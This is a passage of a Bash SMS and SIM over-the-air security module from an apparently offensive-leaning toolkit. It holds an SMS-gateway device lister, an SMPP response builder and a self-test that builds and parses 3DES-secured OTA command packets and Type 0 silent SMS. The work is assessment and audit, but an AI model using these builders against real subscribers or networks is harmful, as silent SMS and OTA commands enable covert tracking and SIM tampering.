    rm -f "$tmp" "$tmp.err"
    return 0
}

# --http-devices — the devices this API key can send from, so --device-id can be
# read rather than guessed. Same host, same header, a GET instead of a POST.
otasm_http_devices() {
    local api='textbee' base='' key='' timeout='20' raw=0
    while (($#)); do
        case "$1" in
            --api|--base|--api-key|--timeout)
                if (($# < 2)); then
                    printf 'ERROR\t%s needs a value\n' "$1" >&2
                    printf 'WHY\t--http-devices takes "--flag value" pairs\n' >&2
                    return 2
                fi
                case "$1" in
                    --api)     api="$2" ;;
                    --base)    base="$2" ;;
                    --api-key) key="$2" ;;
                    --timeout) timeout="$2" ;;
                esac
                shift 2
                ;;
            --raw) raw=1; shift ;;
            *)
                printf 'ERROR\tunknown option: %s\n' "$1" >&2
                printf 'WHY\t--http-devices accepts --api --base --api-key --timeout --raw\n' >&2
                return 2
                ;;
        esac
    done
    case "$api" in
        textbee) : "${base:=https://api.textbee.dev}"; base="${base%/}" ;;
        *)
            printf 'ERROR\t--api %s has no device-list shape in this module\n' "$api" >&2
            printf 'WHY\tGET /api/v1/gateway/devices returns DeviceListResponseDTO (openapi, textbee); another gateway lists its own way and guessing the path would report a lie\n' >&2
            return 2
            ;;
    esac
    : "${key:=${OTASM_HTTP_KEY:-}}"
    if [[ -z "$key" ]]; then
        printf 'ERROR\tthe device list needs an API key and none was given\n' >&2
        printf 'WHY\tevery request carries it in the x-api-key header; set OTASM_HTTP_KEY\n' >&2
        return 2
    fi
    if ! command -v curl >/dev/null 2>&1; then
        printf 'ERROR\tcurl is not installed\n' >&2
        printf 'WHY\tthe request is carried by curl\n' >&2
        return 3
    fi
    local tmp code rc url="$base/api/v1/gateway/devices"
    printf 'http_api\t%s\n' "$api"
    printf 'http_method\tGET\n'
    printf 'http_url\t%s\n' "$url"
    tmp=$(mktemp "${TMPDIR:-/tmp}/otasm-dev.XXXXXX") || return 3
    code=$(curl -sS -o "$tmp" -w '%{http_code}' --max-time "$timeout" \
                -H "x-api-key: $key" "$url" 2>"$tmp.err")
    rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tthe request did not complete\n' >&2
        printf 'WHY\tcurl exit %d: %s\n' "$rc" "$(tr '\n' ' ' < "$tmp.err")" >&2
        rm -f "$tmp" "$tmp.err"
        return 3
    fi
    printf 'http_status\t%s\n' "$code"
    (( raw )) && printf 'http_body_raw\t%s\n' "$(tr -d '\n' < "$tmp")"
    if (( code != 200 )); then
        printf 'ERROR\tthe gateway answered %s\n' "$code" >&2
        printf 'WHY\t401 means the key is missing, invalid or revoked; the device list is scoped to the key'"'"'s account (openapi 401)\n' >&2
        rm -f "$tmp" "$tmp.err"
        return 1
    fi
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$tmp" <<'PY'
import json
import sys

try:
    with open(sys.argv[1], 'rb') as handle:
        doc = json.load(handle)
except Exception as exc:                                    # noqa: BLE001
    print("devices_parsed\tno\t%s" % exc)
    raise SystemExit(3)

devices = doc.get("data", []) if isinstance(doc, dict) else doc
print("devices\t%d" % len(devices))
for device in devices:
    if not isinstance(device, dict):
        continue
    model = " ".join(part for part in (device.get("brand"), device.get("model")) if part)
    print("device\t%s\t%s\tenabled=%s\tdefault=%s\tsim=%d\tsent=%s\treceived=%s"
          % (device.get("_id", "?"), model or "?",
             "true" if device.get("enabled") else "false",
             "true" if device.get("isDefault") else "false",
             len(device.get("simInfo") or []),
             device.get("sentSMSCount", 0), device.get("receivedSMSCount", 0)))
print("devices_parsed\tyes")
PY
        rc=$?
    else
        printf 'devices_parsed\tno\tno python3 to read the JSON\n'
        rc=0
    fi
    rm -f "$tmp" "$tmp.err"
    return $rc
}

# --smpp-response <request-hex> [--status n] — the matching *_resp PDU.
otasm_smpp_response() {
    local raw="${1:-}" status_arg='00' mid='' sysid=''
    shift || true
    while (($#)); do
        case "$1" in
            --status|--message-id|--system-id)
                if (($# < 2)); then
                    printf 'ERROR\t%s needs a value\n' "$1" >&2
                    printf 'WHY\t--smpp-response takes "--flag value" pairs; a flag with no value has no encoding\n' >&2
                    return 2
                fi
                case "$1" in
                    --status)     status_arg="$2" ;;
                    --message-id) mid="$2" ;;
                    --system-id)  sysid="$2" ;;
                esac
                shift 2
                ;;
            *)
                printf 'ERROR\tunknown option: %s\n' "$1" >&2
                printf 'WHY\t--smpp-response accepts --status, --message-id and --system-id\n' >&2
                return 2
                ;;
        esac
    done
    local hex
    hex=$(otasm_norm_hex "$raw")
    if [[ -z "$hex" ]]; then
        printf 'ERROR\t--smpp-response needs the request PDU in hex\n' >&2
        printf 'WHY\tthe response copies the request sequence number and pairs with its command id; without the request there is neither\n' >&2
        return 2
    fi
    if [[ ! "$hex" =~ ^[0-9a-f]+$ ]] || (( ${#hex} % 2 )); then
        printf 'ERROR\tnot a whole number of hex octets: %s\n' "$raw" >&2
        printf 'WHY\ta PDU is octets; the request cannot be read as one\n' >&2
        return 1
    fi
    local total=$(( ${#hex} / 2 ))
    if (( total < 16 )); then
        printf 'ERROR\t%d octets is shorter than the 16-octet SMPP header\n' "$total" >&2
        printf 'WHY\tthe sequence number sits at offset 12; a shorter frame has none to copy\n' >&2
        return 1
    fi
    if (( 16#${hex:0:8} != total )); then
        printf 'ERROR\tcommand_length says %d octets but the request is %d\n' "$(( 16#${hex:0:8} ))" "$total" >&2
        printf 'WHY\tthe request is not a whole PDU (§4.1), so its sequence number is not copied into a response that would look well formed\n' >&2
        return 1
    fi
    local cid="${hex:8:8}" seq="${hex:24:8}" v
    if ! _otasm_smpp_info "$cid"; then
        printf 'ERROR\tcommand id 0x%s is not in the SMPP 3.4 PDU table\n' "$cid" >&2
        printf 'WHY\tthere is no response id defined for it (Table 5-2), so none is invented\n' >&2
        return 1
    fi
    if [[ "$OTASM_SMPP_KIND" == "response" ]]; then
        printf 'ERROR\t%s is already a response\n' "$OTASM_SMPP_NAME" >&2
        printf 'WHY\ta response answers a request; it has no response of its own, so a matching *_resp does not exist\n' >&2
        return 1
    fi
    if ! v=$(_otasm_smpp_uint command_status "$status_arg"); then return 2; fi
    if (( v > 0xffffffff )); then
        printf 'ERROR\tcommand_status %d does not fit four octets\n' "$v" >&2
        printf 'WHY\tthe field is four octets; a larger value has no encoding\n' >&2
        return 2
    fi
    local status=$(printf '%08x' "$v")
    local rid='' body_kind='' refuse=''
    case "$cid" in
        00000001) rid='80000001'; body_kind='system_id' ;;
        00000002) rid='80000002'; body_kind='system_id' ;;
        00000009) rid='80000009'; body_kind='system_id' ;;
        00000004) rid='80000004'; body_kind='message_id' ;;
        00000005) rid='80000005'; body_kind='message_id' ;;
        00000006) rid='80000006'; body_kind='none' ;;
        00000007) rid='80000007'; body_kind='none' ;;
        00000008) rid='80000008'; body_kind='none' ;;
        00000015) rid='80000015'; body_kind='none' ;;
        00000003) refuse='query_sm_resp carries message_id, final_date, message_state and error_code, which are the SMSC answer to a query and not derivable from the request; this verb copies the sequence number and command status, it does not make up a query answer' ;;
        00000021) refuse='submit_multi_resp carries an unsuccess_sme array whose per-destination error codes are not derivable from the request; no body is invented' ;;
        00000103) refuse='data_sm_resp carries a message_id for content that rides in the message_payload optional parameter; this verb does not encode TLVs, so it builds no data_sm_resp' ;;
        0000000b) refuse='outbind is answered by a bind_receiver or bind_transmitter PDU, not by a *_resp; this verb builds responses only and will not substitute a bind' ;;
        00000102) refuse='alert_notification has no response PDU in SMPP 3.4; writing one would invent a command id' ;;
        00000111|00000112|00000113) refuse='the broadcast response bodies are not established by this module; no *_resp is invented for them' ;;
        *) refuse='this request has no response id in this module (Table 5-2 pairing)' ;;
    esac
    if [[ -n "$refuse" ]]; then
        printf 'ERROR\tno response built for %s\n' "$OTASM_SMPP_NAME" >&2
        printf 'WHY\t%s\n' "$refuse" >&2
        return 1
    fi
    local body=''
    case "$body_kind" in
        system_id)  body=$(_otasm_smpp_cstr "$sysid" 16 system_id) || return 1 ;;
        message_id) body=$(_otasm_smpp_cstr "$mid" 65 message_id) || return 1 ;;
        none)       body='' ;;
    esac
    local len=$(( 16 + ${#body} / 2 )) resp_hex
    resp_hex="$(printf '%08x' "$len")${rid}${status}${seq}${body}"
    printf 'request\t%s\n' "$OTASM_SMPP_NAME"
    printf 'request_command_id\t%s\n' "$cid"
    printf 'request_sequence_number\t%s\n' "$seq"
    _otasm_smpp_info "$rid" && printf 'response\t%s\n' "$OTASM_SMPP_NAME"
    printf 'response_command_id\t%s\n' "$rid"
    printf 'command_status\t%s\n' "$status"
    printf 'command_status_name\t%s\n' "$(_otasm_smpp_status "$status")"
    printf 'sequence_number\t%s\n' "$seq"
    printf 'command_length\t%d\n' "$len"
    printf 'hex\t%s\n' "$resp_hex"
    printf 'built\tyes\n'
}

otasm_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export OTASM_DIR="$d/loot/ota_sms"
    mkdir -p "$OTASM_DIR"

    # 1. SPI bit layout (TS 102 225 §5.1.1). The first octet is
    #    b8..b6 reserved, b5b4 counter, b3 ciphering, b2b1 RC/CC/DS, so
    #    counter=3, cipher=1, CC=2 packs as 0x1E -- not 0xB8, which is what
    #    reading the clause's fields in the order they are printed produces.
    chk spi-build "$(fld "$(otasm_spi_build 2 1 3 0 0 0 0)" spi)" "1E00"
    # ── TS 23.041 cell broadcast ───────────────────────────────────────
    chk cb-serial     "$(otasm_cb_serial 1 7 3)" "4073"
    chk cb-serial-gs  "$(otasm_cb_serial 3 0 0)" "c000"
    local cb; cb=$(otasm_cb_build "ALERT" --message-id 1112 --serial 4003)
    chk cb-mid     "$(fld "$cb" message_id)" "1112"
    chk cb-serial  "$(fld "$cb" serial)" "4003"
    chk cb-octets  "$(fld "$cb" data_octets)" "5"
    local cbmsg; cbmsg=$(fld "$cb" cb_message)
    chk cb-msg-len "$(( ${#cbmsg} / 2 ))" "10"
    chk cb-blocks  "$(otasm_cb_blocks "$(fld "$cb" cb_message)" | awk -F'\t' '$1=="blocks"{print $2}')" "4"
    chk cb-frames  "$(otasm_cb_blocks "$(fld "$cb" cb_message)" | awk -F'\t' '$1=="multiframes"{print $2}')" "1"
    chk cb-refuses "$(otasm_cb_build '' >/dev/null 2>&1; echo $?)" "2"
    chk cb-8bit    "$(otasm_cb_build 0102F3 --dcs 04 | awk -F'\t' '$1=="cb_message"{print length($2); exit}')" "16"
    chk spi-build2 "$(fld "$(otasm_spi_build 1 0 0 0 0 0 0)" spi)" "0100"
    local out; out=$(otasm_spi_parse 1E00)
    chk spi-rccds   "$(fld "$out" rccds)" "2"
    chk spi-cipher  "$(fld "$out" ciphering)" "1"
    chk spi-counter "$(fld "$out" counter_mode)" "3"
    chk spi-clean   "$(fld "$out" findings)" "0"
    # b2b1 = 11 is the digital signature, and it is the low bits of the octet
    chk spi-ds      "$(fld "$(otasm_spi_parse 0300)" rccds)" "3"
    # counter 01 with ciphering off and CC on: 0b0000 1010
    chk spi-mid     "$(fld "$(otasm_spi_parse 0A00)" counter_mode)" "1"
    chk spi-mid-cc  "$(fld "$(otasm_spi_parse 0A00)" rccds)" "2"
    # second octet: b2b1 PoR mode, b4b3 PoR RC/CC/DS, b5 PoR ciphered,
    # b6 SMS-SUBMIT (TS 31.115 §4.2)
    chk spi-por-req  "$(fld "$(otasm_spi_parse 0002)" por)" "2"
    chk spi-por-rcc  "$(fld "$(otasm_spi_parse 000C)" por_rccds)" "3"
    chk spi-por-ciph "$(fld "$(otasm_spi_parse 0010)" por_cipher)" "1"
    chk spi-por-subm "$(fld "$(otasm_spi_parse 0020)" por_submit)" "1"
    chk spi-bad     "$(otasm_spi_build 9 0 0 0 0 0 0 >/dev/null 2>&1; echo $?)" "2"

    # 2. Weak SPI is flagged, and unknown/insecure is never reported safe.
    out=$(otasm_spi_parse 0000)
    chk spi-weak-cipher  "$(fld "$out" ciphering_meaning)" "NOT applied (payload in the clear)"
    chk spi-weak-integr  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="HIGH"' | wc -l | tr -d ' ')" "2"
    chk spi-weak-findings "$(fld "$out" findings)" "3"
    out=$(otasm_spi_parse 0400)   # cipher on (b3), no integrity, counter 0
    chk spi-partial "$(fld "$out" findings)" "2"

    # 2b. KIc/KID coding (TS 102 225 §5.1.2, §5.1.3.1): high nibble key set,
    #     b4b3 mode, b2b1 family. 0x15 is key set 1, mode 01 (2-key 3DES),
    #     family 01 (DES).
    out=$(otasm_cmd_key 15)
    chk key-set   "$(fld "$out" key_set)" "1"
    chk key-mode  "$(fld "$out" mode)" "1"
    chk key-fam   "$(fld "$out" family)" "1"
    chk key-des   "$(fld "$(otasm_cmd_key 11)" mode)" "0"
    chk key-ecb   "$(fld "$(otasm_cmd_key 0D)" mode)" "3"
    chk key-prop  "$(fld "$(otasm_cmd_key 03)" family)" "3"
    chk key-impl  "$(fld "$(otasm_cmd_key 00)" family)" "0"
    chk key-same  "$(otasm_cmd_key 15 15 | awk -F'\t' '$1=="finding"' | wc -l | tr -d ' ')" "1"
    chk key-bad   "$(otasm_cmd_key ZZ >/dev/null 2>&1; echo $?)" "2"

    # 3. Command packet build/parse round-trip.
    local pkt; pkt=$(otasm_packet_build 01 010203 5 B800 01 02 aabbcc 01 01)
    out=$(otasm_packet_parse "$pkt")
    chk pkt-cpi   "$(fld "$out" cpi)" "01"
    chk pkt-spi   "$(fld "$out" spi)" "b800"
    chk pkt-kic   "$(fld "$out" kic)" "01"
    chk pkt-kid   "$(fld "$out" kid)" "02"
    chk pkt-tar   "$(fld "$out" tar)" "010203"
    chk pkt-counter "$(fld "$out" counter_dec)" "5"
    chk pkt-data  "$(fld "$out" data)" "aabbcc"
    # CPL counts from the CHI to the end of the Secured Data, so it is the
    # packet's length without the CPI octet and without the CPL field itself.
    chk pkt-cpl-matches "$(fld "$out" cpl)" "$(( $(fld "$out" packet_bytes) - 2 ))"
    chk pkt-cpl-parse "$(otasm_packet_parse "$pkt" >/dev/null 2>&1; echo $?)" "0"
    chk pkt-cpl-lying "$(otasm_packet_parse "01FF${pkt:6}" >/dev/null 2>&1; echo $?)" "1"
    chk pkt-badhex "$(otasm_packet_parse zz >/dev/null 2>&1; echo $?)" "2"
    chk pkt-short  "$(otasm_packet_parse 01 >/dev/null 2>&1; echo $?)" "1"
    # ── TS 31.115 SMS Command Packet with the SPI's security applied ──────
    local sp sms tampered
    sp=$(OTASM_KIC_KEY=00112233445566778899aabbccddeeff \
         OTASM_KID_KEY=00112233445566778899aabbccddeeff \
         otasm_packet_sms_build b00001 4328719365 1600 15 15 801000000c00000000)
    chk sms-packet-bytes "$(fld "$sp" packet_bytes)" "34"
    chk sms-packet-cpl    "$(fld "$sp" cpl)" "32"
    chk sms-packet-chl    "$(fld "$sp" chl)" "21"
    chk sms-packet-pcntr  "$(fld "$sp" pcntr)" "01"
    chk sms-packet-cc     "$(fld "$sp" cc | cut -f1)" "signer"
    # The packet pySim builds for these inputs, byte for byte. A packet that
    # says "ciphered, with a CC" and contains neither cannot match this.
    # One case for the whole packet: the header and the keys are upper, so the
    # cipher text and the CC are too.
    local phex; phex=$(fld "$sp" packet)
    chk sms-packet-upper "$([[ "$phex" == "${phex^^}" ]] && echo yes || echo no)" "yes"
    chk sms-packet-kat "$(fld "$sp" packet | tr 'A-F' 'a-f')" \
        "00201516001515b000018405f7d95d3f0f438ae0669d9f5c2bd3ee323f8f0f19105a"
    local sp2; sp2=$(OTASM_KIC_KEY=00112233445566778899aabbccddeeff \
         OTASM_KID_KEY=00112233445566778899aabbccddeeff \
         otasm_packet_sms_build ffffff 255 1600 15 15 801000000c00000000010203040506070809)
    chk sms-packet-kat2 "$(fld "$sp2" packet | tr 'A-F' 'a-f')" \
        "00281516001515ffffff8f56486d31d486039534c25d23d75669e997327cbc0786805b3877c7e3b5f6c3"
    local rd; rd=$(OTASM_KIC_KEY=00112233445566778899aabbccddeeff \
         OTASM_KID_KEY=00112233445566778899aabbccddeeff \
         otasm_packet_sms_parse "$(fld "$sp" packet)")
    chk sms-roundtrip-apdu "$(fld "$rd" apdu)" "801000000C00000000"
    chk sms-roundtrip-cc   "$(fld "$rd" cc_verdict)" "verified"
    chk sms-roundtrip-pad  "$(fld "$rd" padding_octets)" "1"
    chk sms-roundtrip-rc   "$(OTASM_KIC_KEY=00112233445566778899aabbccddeeff \
         OTASM_KID_KEY=00112233445566778899aabbccddeeff \
         otasm_packet_sms_parse "$(fld "$sp" packet)" >/dev/null 2>&1; echo $?)" "0"
    # A single bit changed in the secured data must not verify.
    sms=$(fld "$sp" packet | tr 'A-F' 'a-f')
    local n=${#sms}
    tampered="${sms:0:n-30}$(printf '%02x' $(( 0x${sms:n-30:2} ^ 1 )))${sms:n-28}"
    chk sms-tamper-rc "$(OTASM_KIC_KEY=00112233445566778899aabbccddeeff \
         OTASM_KID_KEY=00112233445566778899aabbccddeeff \
         otasm_packet_sms_parse "$tampered" >/dev/null 2>&1; echo $?)" "1"
    chk sms-tamper-verdict "$(OTASM_KIC_KEY=00112233445566778899aabbccddeeff \
         OTASM_KID_KEY=00112233445566778899aabbccddeeff \
         otasm_packet_sms_parse "$tampered" 2>/dev/null | awk -F'\t' '$1=="cc_verdict"{print $2}')" "mismatch"
    # Without the key material the builder refuses rather than emitting a
    # packet that claims protection it does not have.
    chk sms-nokey-rc "$(OTASM_KIC_KEY= OTASM_KID_KEY= otasm_packet_sms_build b00001 1 1600 15 15 8010 >/dev/null 2>&1; echo $?)" "2"
    chk sms-nokey-says "$(OTASM_KIC_KEY= OTASM_KID_KEY= otasm_packet_sms_build b00001 1 1600 15 15 8010 2>&1 >/dev/null | grep -c OTASM_KIC_KEY)" "1"
    chk sms-rc-only "$(OTASM_KIC_KEY=00 OTASM_KID_KEY=00 otasm_packet_sms_build b00001 1 1200 15 15 80 >/dev/null 2>&1; echo $?)" "2"
    # ── the card's Response Packet (TS 102 225 §5.2, TS 31.115 SMS form) ──
    # These four packets are pySim's own 3DES test vectors, so the status
    # word, the CC and the CompactRemoteResp are read the same way by two
    # implementations. SPI 0601 = PoR required, no RC/CC/DS, unciphered;
    # 0609 adds a CC; 0619 adds ciphering on top of it.
    local rp
    rp=$(otasm_resp_sms_parse 0601 027100000e0ab000110000000000000001612f)
    chk resp-transport  "$(fld "$rp" transport)" "sms-udh"
    chk resp-rpl        "$(fld "$rp" rpl)" "14"
    chk resp-rhl        "$(fld "$rp" rhl)" "10"
    chk resp-tar        "$(fld "$rp" tar)" "B00011"
    chk resp-status     "$(fld "$rp" status)" "00"
    chk resp-sig-len    "$(fld "$rp" sig_len)" "0"
    chk resp-cc-none    "$(fld "$rp" cc_verdict)" "not-present"
    chk resp-ncmd       "$(fld "$rp" number_of_commands)" "1"
    chk resp-sw         "$(fld "$rp" last_status_word)" "612F"
    rp=$(OTASM_KID_KEY=12110C78E678C25408233076AA033615 \
         otasm_resp_sms_parse 0609 027100001612b000110000000000000055f47118381175fb01612f)
    chk resp-signed-len "$(fld "$rp" sig_len)" "8"
    chk resp-signed-cc  "$(fld "$rp" cc_verdict)" "verified"
    rp=$(OTASM_KIC_KEY=C21DD66ACAC13CB3BC8B331B24AFB57B \
         OTASM_KID_KEY=12110C78E678C25408233076AA033615 \
         otasm_resp_sms_parse 0619 027100001c12b000119660ebdb81be189b5e4389e9e7ab2bc0954f963ad869ed7c)
    chk resp-ciphered-pcntr "$(fld "$rp" pcntr)" "06"
    chk resp-ciphered-pad   "$(fld "$rp" padding_octets)" "6"
    chk resp-ciphered-sw    "$(fld "$rp" last_status_word)" "612F"
    chk resp-ciphered-cc    "$(fld "$rp" cc_verdict)" "verified"
    # One bit in the CC and the packet must not verify.
    chk resp-tamper-rc "$(OTASM_KID_KEY=12110C78E678C25408233076AA033615 \
         otasm_resp_sms_parse 0609 027100001612b000110000000000000055f47118381175fb02612f \
         >/dev/null 2>&1; echo $?)" "1"
    chk resp-rpl-lying "$(otasm_resp_sms_parse 0609 027100001512b000110000000000000055f47118381175fb01612f \
         >/dev/null 2>&1; echo $?)" "1"
    chk resp-rhl-bad   "$(otasm_resp_sms_parse 0609 02710000160bb000110000000000000055f47118381175fb01612f \
         >/dev/null 2>&1; echo $?)" "1"
    chk resp-command-udh "$(otasm_resp_sms_parse 027000000e0ab000110000000000000001612f \
         >/dev/null 2>&1; echo $?)" "1"
    # Without its UDH the packet is still readable: the SMS form fixes the UDH
    # at 02 71 00, which is also what the CC is computed over.
    rp=$(OTASM_KID_KEY=12110C78E678C25408233076AA033615 \
         otasm_resp_sms_parse 0609 001612b000110000000000000055f47118381175fb01612f)
    chk resp-bare-udh   "$(fld "$rp" udh_source)" "assumed"
    chk resp-bare-cc    "$(fld "$rp" cc_verdict)" "verified"
    chk resp-default-spi "$(fld "$(otasm_resp_sms_parse 027100000e0ab000110000000000000001612f)" spi_source)" "default"
    chk resp-status-nz  "$(fld "$(otasm_resp_sms_parse 027100000b0ab000110000000000000a)" status_meaning)" \
        "insufficient security level"

    # a large payload forces the two-octet CPL form and still round-trips.
    local big; big=$(printf 'aa%.0s' {1..200})
    pkt=$(otasm_packet_build 01 010203 9 B800 01 02 "$big" 01 01)
    chk pkt-big-cpl-oct "$(fld "$(otasm_packet_parse "$pkt")" cpl_octets)" "2"
    chk pkt-big-data-len "$(( ${#big} / 2 ))" "200"

    # 4. Counter / replay decisions per the SPI mode.
    chk cnt-none    "$(fld "$(otasm_counter_check 100 100 0)" verdict)" "process (counter absent — no replay protection)"
    chk cnt-info    "$(fld "$(otasm_counter_check 100 100 1)" verdict)" "process (counter informational only)"
    chk cnt-gt-ok   "$(fld "$(otasm_counter_check 101 100 2)" verdict)" "process (counter above the received value)"
    chk cnt-gt-rep  "$(fld "$(otasm_counter_check 100 100 2)" verdict)" "REPLAY (counter not above RE)"
    chk cnt-seq-ok  "$(fld "$(otasm_counter_check 101 100 3)" verdict)" "process (counter is exactly RE+1)"
    chk cnt-seq-rep "$(fld "$(otasm_counter_check 103 100 3)" verdict)" "REPLAY (counter is not RE+1)"
    chk cnt-badmode "$(otasm_counter_check 1 1 9 >/dev/null 2>&1; echo $?)" "2"

    # 5. TS 23.040 TP layer: packing, field codecs, TPDU round-trip, Type 0.
    #    The packing vector is TS 23.038 §6.1.2.1.1's own, shared with 38_ussd.
    chk tp-pack-hi    "$(otasm_tp_pack_text hi)" "e834"
    chk tp-pack-Hi    "$(otasm_tp_pack_text Hi)" "c834"
    chk tp-pack-hello "$(otasm_tp_pack_text hello)" "e8329bfd06"
    chk tp-pack-Hello "$(otasm_tp_pack_text Hello)" "c8329bfd06"
    chk tp-pack-rt    "$(otasm_tp_unpack_text "$(otasm_tp_pack_text Hello)" 5)" "Hello"
    chk tp-kat        "$(fld "$(otasm_tp_packing_kat)" failures)" "0"

    # Semi-octet swap plus the signed quarter-hour time zone (§9.2.3.11).
    local scts; scts=$(otasm_tp_scts_build 240517143000 8)
    chk tp-scts-build "$scts" "42507141030080"
    chk tp-scts-year  "$(fld "$(otasm_tp_scts_parse "$scts")" scts_year)" "2024"
    chk tp-scts-day   "$(fld "$(otasm_tp_scts_parse "$scts")" scts_day)" "17"
    chk tp-scts-tz    "$(fld "$(otasm_tp_scts_parse "$scts")" scts_tz_quarters)" "8"
    chk tp-scts-neg   "$(fld "$(otasm_tp_scts_parse "$(otasm_tp_scts_build 240101000000 -20)")" scts_tz_quarters)" "-20"
    chk tp-scts-bad   "$(otasm_tp_scts_build 2405 0 >/dev/null 2>&1; echo $?)" "2"

    # Address field: odd digit counts carry an 'F' fill semi-octet (§9.1.2.5).
    local af; af=$(otasm_tp_addr_build 1 1 15551234567)
    chk tp-addr-build "$af" "0b915155214365f7"
    chk tp-addr-value "$(fld "$(otasm_tp_addr_parse "$af")" addr_value)" "15551234567"
    chk tp-addr-ton   "$(fld "$(otasm_tp_addr_parse "$af")" toa_ton_meaning)" "international"
    chk tp-addr-odd   "$(otasm_tp_addr_build 2 0 5551234)" "07a0551532f4"
    chk tp-addr-odd-v "$(fld "$(otasm_tp_addr_parse "$(otasm_tp_addr_build 2 0 5551234)")" addr_value)" "5551234"
    chk tp-addr-alpha "$(otasm_tp_addr_build 5 0 1234 >/dev/null 2>&1; echo $?)" "2"
    chk tp-addr-short "$(otasm_tp_addr_parse 0b91 >/dev/null 2>&1; echo $?)" "1"

    # TP-PID: Type 0 is the silent one (§9.2.3.9), and it must be reported.
    chk tp-pid-40-silent "$(fld "$(otasm_tp_pid_parse 40)" pid_silent)" "yes"
    chk tp-pid-40-find   "$(fld "$(otasm_tp_pid_parse 40)" findings)" "1"
    chk tp-pid-00-quiet  "$(fld "$(otasm_tp_pid_parse 00)" pid_silent)" "no"
    chk tp-pid-48        "$(fld "$(otasm_tp_pid_parse 48)" pid_meaning)" "Device Triggering Short Message"
    chk tp-pid-7f        "$(fld "$(otasm_tp_pid_parse 7f)" pid_meaning)" "(U)SIM Data download"
    chk tp-pid-c0        "$(fld "$(otasm_tp_pid_parse c0)" pid_group)" "SC specific"

    # TP-DCS: alphabet, class, and the reserved groups that must not be
    # silently read as the 7-bit default (TS 23.038 §4).
    chk tp-dcs-00   "$(fld "$(otasm_tp_dcs_parse 00)" dcs_meaning)" "GSM 7-bit default alphabet, no message class"
    chk tp-dcs-08   "$(fld "$(otasm_tp_dcs_parse 08)" dcs_alphabet)" "UCS2 (16-bit)"
    chk tp-dcs-f0-c "$(fld "$(otasm_tp_dcs_parse f0)" dcs_class)" "0"
    chk tp-dcs-f0-d "$(fld "$(otasm_tp_dcs_parse f0)" dcs_class0_immediate_display)" "yes"
    chk tp-dcs-80   "$(fld "$(otasm_tp_dcs_parse 80)" findings)" "1"
    chk tp-dcs-d0   "$(fld "$(otasm_tp_dcs_parse d0)" dcs_group)" "MWI: store message (1101)"
    chk tp-dcs-build "$(otasm_tp_dcs_build ucs2 none 0 0)" "08"
    chk tp-dcs-bld-c "$(otasm_tp_dcs_build 8bit 2 0 1)" "56"
    chk tp-dcs-bad   "$(otasm_tp_dcs_build klingon none 0 0 >/dev/null 2>&1; echo $?)" "2"

    # TP-FCS / TP-ST: an SC rejecting Type 0 answers with 0x81 (§9.2.3.22).
    chk tp-fcs-81 "$(fld "$(otasm_tp_fcs_parse 81)" fcs_meaning)" "Short message Type 0 not supported"
    chk tp-fcs-90 "$(fld "$(otasm_tp_fcs_parse 90)" fcs_meaning)" "Data coding scheme (alphabet) not supported"
    chk tp-fcs-res "$(fld "$(otasm_tp_fcs_parse 83)" fcs_meaning)" "reserved — treat as an unspecified error cause"
    chk tp-st-00  "$(fld "$(otasm_tp_st_parse 00)" st_meaning)" "Short message received by the SME (transaction completed)"
    chk tp-st-23  "$(fld "$(otasm_tp_st_parse 23)" st_meaning)" "Service rejected (temporary error, SC still trying)"
    chk tp-st-res "$(fld "$(otasm_tp_st_parse 03)" st_meaning)" "reserved — interpret as Service Rejected (0x23)"

    # Full TPDU: build a Type 0 silent SMS-DELIVER and read it back.
    local t0; t0=$(otasm_type0_build "" "$scts")
    chk tp-type0-len  "$(fld "$(otasm_tpdu_parse "$t0")" tpdu_octets)" "15"
    chk tp-type0-mti  "$(fld "$(otasm_tpdu_parse "$t0")" mti)" "0"
    chk tp-type0-pid  "$(fld "$(otasm_tpdu_parse "$t0")" pid)" "40"
    chk tp-type0-udl  "$(fld "$(otasm_tpdu_parse "$t0")" udl)" "0"
    chk tp-type0-empty "$(fld "$(otasm_tpdu_parse "$t0")" ud_empty)" "yes"
    chk tp-type0-scts "$(fld "$(otasm_tpdu_parse "$t0")" scts_local)" "2024-05-17T14:30:00"
    chk tp-type0-audit "$(fld "$(otasm_type0_audit "$t0")" type0_is_type0)" "yes"
    chk tp-type0-find  "$(( $(fld "$(otasm_type0_audit "$t0")" findings) >= 1 ? 1 : 0 ))" "1"

    # The severity channel is reserved for counted findings: every line emitted
    # as "finding" must be reflected in the findings total, and an informational
    # line must arrive as "note". This invariant caught a MEDIUM that was printed
    # but never counted, so it is asserted rather than assumed.
    local t0o; t0o=$(otasm_type0_audit "$t0")
    chk tp-type0-count "$(fld "$t0o" findings)" "2"
    chk tp-type0-tally "$(printf '%s\n' "$t0o" | awk -F'\t' '$1=="finding"' | wc -l | tr -d ' ')" "$(fld "$t0o" findings)"
    chk tp-no-info-finding "$(printf '%s\n' "$t0o" "$(otasm_spi_parse B800)" "$(otasm_tp_fcs_parse 81)" "$(otasm_spi_parse 0000)" | awk -F'\t' '$1=="finding" && $2=="INFO"' | wc -l | tr -d ' ')" "0"
    chk tp-spi-tally "$(printf '%s\n' "$(otasm_spi_parse 0000)" | awk -F'\t' '$1=="finding"' | wc -l | tr -d ' ')" "$(fld "$(otasm_spi_parse 0000)" findings)"

    # SMS-SUBMIT round-trip through the address field and the packer.
    local sub; sub=$(otasm_tpdu_build_submit "$af" 00 00 "$(otasm_tp_pack_text hello)" 5 7 0 "" 0)
    out=$(otasm_tpdu_parse "$sub")
    chk tp-sub-mti   "$(fld "$out" mti)" "1"
    chk tp-sub-mr    "$(fld "$out" mr)" "07"
    chk tp-sub-da    "$(fld "$out" da_value)" "15551234567"
    chk tp-sub-ud    "$(fld "$out" ud)" "e8329bfd06"
    chk tp-sub-units "$(fld "$out" udl_units)" "septets (5 septets in 5 octets)"

